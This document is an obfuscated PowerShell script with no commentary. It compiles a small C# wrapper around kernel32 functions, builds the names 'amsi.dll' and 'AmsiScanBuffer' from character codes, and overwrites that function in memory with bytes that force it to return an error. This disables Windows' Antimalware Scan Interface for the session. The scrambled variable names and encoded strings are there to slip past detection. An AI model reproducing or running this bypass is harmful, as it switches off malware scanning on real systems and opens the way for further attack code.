$KtIrh9Pqw12ac = @"
using System;
using System.Runtime.InteropServices;
public class KtIrh9Pqw12ac {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr H3YOV7VHYLkFQd5yfL, string jPT39DwBt5f);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr AZu6, UIntPtr xkgBy_NVu, uint d57pnuf, out uint zCO2_xpU0Cbvyw7kxC);
}
"@

Add-Type $KtIrh9Pqw12ac

$FutnwmEP1qKli = [KtIrh9Pqw12ac]::LoadLibrary("$([cHAR]([BYtE]0x61)+[CHaR]([byTe]0x6d)+[cHaR](115)+[CHar](105)+[ChAr](46*40/40)+[CHAr]([BYTE]0x64)+[ChAR]([ByTe]0x6c)+[CHAr](93+15))")
$AgqcKF6re = [KtIrh9Pqw12ac]::GetProcAddress($FutnwmEP1qKli, "$([char]([byte]0x41)+[cHar]([BYTE]0x6d)+[chaR]([BYTE]0x73)+[chaR](105+52-52)+[CHAr]([BYTE]0x53)+[CHaR](52+47)+[cHaR](97+5-5)+[CHAR]([byTE]0x6e)+[CHaR](66*49/49)+[char](117)+[cHaR](102*26/26)+[CHar](102*13/13)+[cHAr]([bytE]0x65)+[CHAR](114))")
$p = 0
[KtIrh9Pqw12ac]::VirtualProtect($AgqcKF6re, [uint32]5, 0x40, [ref]$p)
$UACJP = "0xB8"
$OLv2Yr = "0x57"
$sIwEJE = "0x00"
$NsQn2OtoFW40JAMKf2O = "0x07"
$e3324eFm = "0x80"
$Mgu44 = "0xC3"
$yBKi3GpBg71gK2Z = [Byte[]] ($UACJP,$OLv2Yr,$sIwEJE,$NsQn2OtoFW40JAMKf2O,+$e3324eFm,+$Mgu44)
[System.Runtime.InteropServices.Marshal]::Copy($yBKi3GpBg71gK2Z, 0, $AgqcKF6re, 6)